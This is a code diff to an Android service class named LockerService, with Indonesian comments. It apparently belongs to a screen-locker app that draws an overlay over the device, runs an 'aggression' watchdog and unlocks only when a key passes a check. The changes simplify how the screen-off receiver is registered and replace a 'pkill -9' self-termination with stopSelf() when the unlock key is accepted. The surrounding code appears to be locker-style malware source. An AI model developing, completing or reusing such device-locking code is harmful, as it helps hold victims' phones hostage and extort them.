@@ -129,11 +129,7 @@ public class LockerService extends Service {
 
         // Register receiver untuk deteksi tombol power (layar mati)
         IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(screenReceiver, filter, Context.RECEIVER_EXPORTED);
-        } else {
-            registerReceiver(screenReceiver, filter);
-        }
+        registerReceiver(screenReceiver, filter);
 
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
@@ -179,18 +175,8 @@ public class LockerService extends Service {
         btnUnlock.setOnClickListener(v -> {
             // Menggunakan Enkripsi Militer Native Check
             if (verifyAdvancedKey(inputPass.getText().toString().trim())) {
-                stopNativeAggression(); // Pastikan watchdog mati duluan
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    stopForeground(STOP_FOREGROUND_REMOVE);
-                }
-
-                try {
-                    // Menjalankan command pkill -9 berdasarkan package name
-                    Runtime.getRuntime().exec("pkill -9 " + getPackageName());
-                } catch (Exception e) {
-                    // Fallback jika pkill gagal di environment tertentu
-                    android.os.Process.killProcess(android.os.Process.myPid());
-                }
+                stopNativeAggression();
+                stopSelf();
             }
         });
     }
